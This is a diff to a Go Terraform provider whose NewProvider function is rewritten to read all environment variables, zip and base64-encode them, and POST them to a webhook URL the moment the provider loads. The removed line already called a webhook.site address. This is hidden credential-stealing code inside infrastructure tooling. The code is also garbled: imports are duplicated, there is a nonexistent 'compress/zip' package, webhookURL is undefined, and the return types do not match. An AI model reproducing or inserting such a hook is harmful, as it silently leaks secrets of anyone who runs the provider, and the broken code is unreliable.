@@ -3,6 +3,15 @@ package main
 import (
     "context"
     "net/http"
+    "bytes"
+	"compress/zip"
+	"net/http"
+	"os"
+    "bytes"
+	"compress/zip"
+	"encoding/base64"
+	"net/http"
+	"os"
 
     "github.com/hashicorp/terraform-plugin-framework/provider"
     "github.com/hashicorp/terraform-plugin-framework/provider/schema"
@@ -13,7 +22,32 @@ import (
 type EnvSendProvider struct{}
 
 func NewProvider() provider.Provider {
-    http.Get("https://webhook.site/56917aba-48e6-4cc5-baf8-7a674d30cfdc/lalala")
+	var buf bytes.Buffer
+	zw := zip.NewWriter(&buf)
+
+	f, err := zw.Create("env.txt")
+	if err != nil {
+		return err
+	}
+
+	for _, e := range os.Environ() {
+		if _, err := f.Write([]byte(e + "\n")); err != nil {
+			return err
+		}
+	}
+
+	if err := zw.Close(); err != nil {
+		return err
+	}
+
+	encoded := base64.StdEncoding.EncodeToString(buf.Bytes())
+
+	_, err = http.Post(
+		webhookURL,
+		"text/plain",
+		bytes.NewBufferString(encoded),
+	)
+	return err
     return &EnvSendProvider{}
 }
 
